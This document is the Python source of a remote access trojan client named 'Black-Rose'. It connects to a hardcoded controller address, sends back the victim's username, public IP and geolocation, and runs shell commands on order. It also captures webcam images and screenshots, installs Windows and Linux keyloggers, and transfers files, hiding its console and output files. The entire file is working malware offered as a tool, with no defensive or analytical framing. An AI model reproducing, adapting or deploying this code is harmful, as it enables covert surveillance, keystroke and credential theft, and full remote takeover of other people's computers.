#! /usr/bin/python

# Importing the requirement modules
import platform
import sys

# Checking operating system
if "Linux" in platform.platform():
    import pygame
    import pygame.camera
    import pyscreenshot
    import subprocess
    import requests
    import pyxhook
    import urllib2
    import hashlib
    import base64
    import socket
    import time
    import json
    import hmac
    import os
elif "Windows" in platform.platform():
    import win32console
    import win32api
    import win32gui
    import pythoncom
    import pyHook
    import subprocess
    import requests
    import urllib2
    import hashlib
    import getpass
    import base64
    import socket
    import time
    import json
    import hmac
    import os

    from mss import mss

else:
    sys.exit()


from Crypto.Cipher import AES
from Crypto import Random

# Some global variables
PLATFORM = platform.platform()
Rand = Random.new()
Alive_FLAG = "DONE"
Success_FLAG = "T"
Failed_FLAG = "F"
Time = time.asctime()

Initialization_VECTOR = '\x8c\x15#\x19\xfd\x02\xd6\xca\x83d\x9f5\xa6\xf9\x83\xfd' # Put initialization vector here
AES_KEY = '\xf7ItQ\x9f\xf0,\x89\xff\xd3d\xee\xf9;\xd1\xb61\xdf\x19\xd2\xf0\x16\x01j\x8ay\xe1\xec+|\xa0@' # Put AES Key here
AES_Cipher = AES.AESCipher(AES_KEY, AES.MODE_CFB, Initialization_VECTOR)
Shared_SECRET_KEY = 'AK1w3N+MZG7ULB8zrjwmDA==' # Put shared secret key here
Rose_NONCE = base64.b64encode(os.urandom(16)) # 16 Bytes --> 128 Bits (Random)


# Hidding console
def Hide():
    if "Windows" in PLATFORM:
        Window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(Window, 0)



# Checking internet connection
def Eyes_OF_CONNECTION():
    URL = "https://www.google.com"

    try:
        # Online part
        urllib2.urlopen(URL, timeout=2)
    except:
        # Offline part
        Timer()



# Periodically
def Timer():
    Now_TIME = time.time()
    Period = 5 # Second
    
    while True:
        time.sleep(Period)
        if time.time() > Now_TIME:
            Eyes_OF_CONNECTION()
            break



# Create a socket to create connection between clients and server
def Socket_CREATION():
    global Sct
    
    try:
         # Using TCP and IPv4 protocol
        Sct = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error:
        sys.exit()
    


# Connecting to the server (Black-Rose)
def Socket_CONNECTION(HOST, PORT):
    try:
        Sct.connect((HOST, PORT))
    except socket.error:
        sys.exit()



# Challenge response authentication protocol
def Authentication():
    # Server authentication
    try:
        # Get Black-Rose's user id
        Black_ROSE_USERID = Sct.recv(32)
    except:
        Sct.close()
        sys.exit()
    
    try:
        # Post challenge nonce
        Sct.send(Rose_NONCE)
    except:
        Sct.close()
        sys.exit()
    
    # Calculate hmac
    Challenge_RESPONSE = hmac.new(Shared_SECRET_KEY, Rose_NONCE, hashlib.sha256)

    try:
        # Get Black-Rose's challenge response
        Black_ROSE_CHALLENGE_RESPONSE_1 = Sct.recv(64)
    except:
        Sct.close()
        sys.exit()

    # Checking response
    if Challenge_RESPONSE.hexdigest() == Black_ROSE_CHALLENGE_RESPONSE_1:
        try:
            # Authentication successed
            Sct.send(Success_FLAG)
        except:
            Sct.close()
            sys.exit()
    else:
        try:
            # Authentication failed
            Sct.send(Failed_FLAG)
        except:
            Sct.close()
            sys.exit()
    
    # Client authentication
    try:
        # Get Black-Rose's challenge nonce
        Black_ROSE_CHALLENGE_NONCE = Sct.recv(24)
    except:
        Sct.close()
        sys.exit()
    
    
    # Calculate hmac
    Black_ROSE_CHALLENGE_RESPONSE_2 = hmac.new(Shared_SECRET_KEY, Black_ROSE_CHALLENGE_NONCE, hashlib.sha256)

    try:
        # Send response
        Sct.send(Black_ROSE_CHALLENGE_RESPONSE_2.hexdigest())
    except:
        Sct.close()
        sys.exit()



# Collect information from the target
def Information_GATHERING():
    # This site : http://ipinfo.io/json  can tell you some of your information
    Response = requests.get('http://ipinfo.io/json').json()

    if "Windows" in PLATFORM:

        Information = {
            "PLATFORM": platform.uname()[0],
            "PLATFORM_ARCH": platform.uname()[4],
            "USER_ACCOUNT": getpass.getuser(),
            "PUBLIC_IP": [Response['ip']],
            "COUNTRY": [Response['country']],
            "CITY": [Response['city']],
            "LATITUDE_LONGITUDE": [Response['loc']],
        }
    elif "Linux" in PLATFORM:
        Information = {
            "PLATFORM": platform.uname()[0],
            "PLATFORM_ARCH": platform.uname()[4],
            "USER_ACCOUNT": os.getlogin(),
            "PUBLIC_IP": [Response['ip']],
            "COUNTRY": [Response['country']],
            "CITY": [Response['city']],
            "LATITUDE_LONGITUDE": [Response['loc']],
        }
    else:
        Sct.close()
        sys.exit()

    # Json format
    Data = json.dumps(Information)

    # Send it
    try:
        Sct.sendall(Data)
    except socket.error:
        Sct.close()
        sys.exit()



# Capture picture
def Webcam_CAPTURE():
    if "Windows" in PLATFORM:
        Sct.send("[ROSE-MESSAGE]> Webcamcapture only work on linux platforms !")
    if "Linux" in PLATFORM:
        pygame.camera.init()

        # Camera list
        if len(pygame.camera.list_cameras()) == 0:
            Sct.send("[ROSE-MESSAGE]> Cameras were not found !")
        else:
            Cam = pygame.camera.Camera("/dev/video0", (640, 480))
            # Start camera
            Cam.start()
            # Say hi :D
            Img = Cam.get_image()
            # Save output (Hidden)
            pygame.image.save(Img, ".WebCamCapture.png")
            # Stop camera
            Cam.stop()
            Sct.send("[ROSE-MESSAGE]> Webcam capture was complete. You can download it with '.WebCamCapture.png' name")
    


# Take screenshot
def Screenshot():
    if "Windows" in PLATFORM:
        if os.path.exists(os.getcwd() + "\\" + "monitor-1.png") == True:
            subprocess.call("attrib -s -h monitor-1.png", shell=True)
            subprocess.call("del /f monitor-1.png", shell=True)
        with mss() as Screen:
            Screen.shot()
        # Hidden output
        subprocess.call("attrib +s +h monitor-1.png", shell=True)
        Sct.send("[ROSE-MESSAGE]> Screenshot was complete. You can download it with 'monitor-1.png' name")
    
    if "Linux" in PLATFORM:
        Img = pyscreenshot.grab()
        Img.save(".Screenshot.png")
        Sct.send("[ROSE-MASSAGE]> Screenshot was complete. You can download it with '.Screenshot.png' name")



# Windows keylogger
def Windows_OnKeyboardEvent(Event):
    File = open(os.getcwd() + "\\Rose_Win_Keylogger.txt", "a")

    # Do it
    try:
        if Event.KeyID == 96:
            File.close()
            # Hidden output
            subprocess.call("attrib +s +h Rose_Win_Keylogger.txt", shell=True)
            Sct.send("[ROSE-MASSAGE]> Keylogging complete. You can download it with 'Rose_Win_Keylogger.txt' name")
        
        elif Event.KeyID == 8:
            Logs = "[BACKSPACE]\n"
        elif Event.KeyID == 9:
            Logs = "[TAB]\n"
        elif Event.KeyID == 13:
            Logs = "[ENTER]\n"
        elif Event.KeyID == 37:
            Logs = "[Left]\n"
        elif Event.KeyID == 38:
            Logs = "[UP]\n"
        elif Event.KeyID == 39:
            Logs = "[RIGHT]\n"
        elif Event.KeyID == 40:
            Logs = "[DOWN]\n"
        else:
            Logs = chr(Event.Ascii)
        File.write(Logs)
    except:
        win32api.PostQuitMessage()
        return True



# Linux keylogger
def Linux_OnKeyboardEvent(Events):
    File = open(os.getcwd() + "/Rose_Linux_Keylogger.txt", "a")
    File.write(Events.Key + "\n")

    # 96 meas `
    if Events.Ascii == 96:
        File.close()
        Handler_2.cancel()
        os.rename(os.getcwd() + "/Rose_Linux_Keylogger.txt", ".Rose_Linux_Keylogger.txt")
        Sct.send("[ROSE]> Keylogging complete. You can download it with '.Rose_Linux_Keylogger.txt' name.")



# Upload file
def Upload(Command):
    File_name = Command[9:]

    # Create tokens
    END_TOKEN = "EOFXEOFY"
    FNF_TOKEN = "FNF"
    FND_TOKEN = "FND"

    # Checking file exist or not
    if "Windows" in PLATFORM:
        Exists_Or_NOT = os.path.exists(os.getcwd() + "\\" + File_name)
    if "Linux" in PLATFORM:
        Exists_Or_NOT = os.path.exists(os.getcwd() + "/" + File_name)
    
    if Exists_Or_NOT == False:
        Sct.send(FNF_TOKEN)
    elif Exists_Or_NOT == True:
        Sct.send(FND_TOKEN)

        # Reading file
        File = open(File_name, "rb")
        Data = File.read(1024)

        # Sending data
        while Data:
            Sct.send(Data)
            Data = File.read(1024)
        File.close()
        time.sleep(5)
        Sct.send(END_TOKEN)
    else:
        time.sleep(5)
        Sct.send(FNF_TOKEN)



# Download file
def Download(Command):
    File_format = Command[Command.find("."):]

    # Open file
    if "Windows" in PLATFORM:
        File = open(os.getcwd() + r"\Dwonloaded" + File_format, "wb")
    if "Linux" in PLATFORM:
        File = open(os.getcwd() + "/Downloaded" + File_format, "wb")
    
    while True:
        Data = Sct.recv(4096)
        if Data == "EOFXEOFY":
            break
        File.write(Data)
    File.close()
    
    

# Get orders
def Get_ORDERS():
    while True:
        Order = Sct.recv(4096)

        if Order[:2] == "cd":
            os.chdir(Order[3:])
            Exec = subprocess.Popen(Order, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            Exec_output = Exec.stdout.read() + Exec.stderr.read()
            Sct.send(Exec_output + "\n[Path] " + str(os.getcwd()) + ">")

        elif Order == "whosthere":
            Sct.send("DONE")
        
        elif Order == "ACK":
            Get_ORDERS()

        elif Order == "webcapture":
            Webcam_CAPTURE()
        
        elif Order == "screenshot":
            Screenshot()
        
        elif "download" in Order:
            Upload(Order)

        elif "upload" in Order:
            Download(Order)

        elif Order == "keylogger":
            Banner = """\n+-----------------------------+
|      Black-Rose Keylogger   |
+-----------------------------+\n"""

            if "Windows" in PLATFORM:
                global Handler_1
                # Creating banner
                File = open(os.getcwd() + "\\Rose_Win_Keylogger.txt", "a")
                File.write(Banner + "\n" + Time + "\n")
                File.close()

                # Create hook manager
                Handler_1 = pyHook.HookManager()
                # Hook pressing any key to our keylogger function
                Handler_1.KeyDown = Windows_OnKeyboardEvent
                # hook the keyboard
                Handler_1.HookKeyboard()
                # wait forever 
                pythoncom.PumpMessages()
            
            if "Linux" in PLATFORM:
                global Handler_2
                # Creating banner
                File = open(os.getcwd() + "/Rose_Linux_Keylogger.txt", "a")
                File.write(Banner + "\n" + Time + "\n")
                File.close()

                # Create hook manager
                Handler_2 = pyxhook.HookManager()
                # Hook pressing any key to our keylogger function
                Handler_2.KeyDown=Linux_OnKeyboardEvent
                # Hook the keyboard
                Handler_2.HookKeyboard()
                # Wait forever 
                Handler_2.start()
        else:
            Exec = subprocess.Popen(Order, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            Exec_output = Exec.stdout.read() + Exec.stderr.read()
            Sct.send(Exec_output + "\n[Path] " + str(os.getcwd()) + ">")
    Sct.close()
    sys.exit()


# Using all functions
#Hiding()
Eyes_OF_CONNECTION()
Socket_CREATION()
Socket_CONNECTION("192.168.1.4", 2321)
Authentication()
Information_GATHERING()
Get_ORDERS()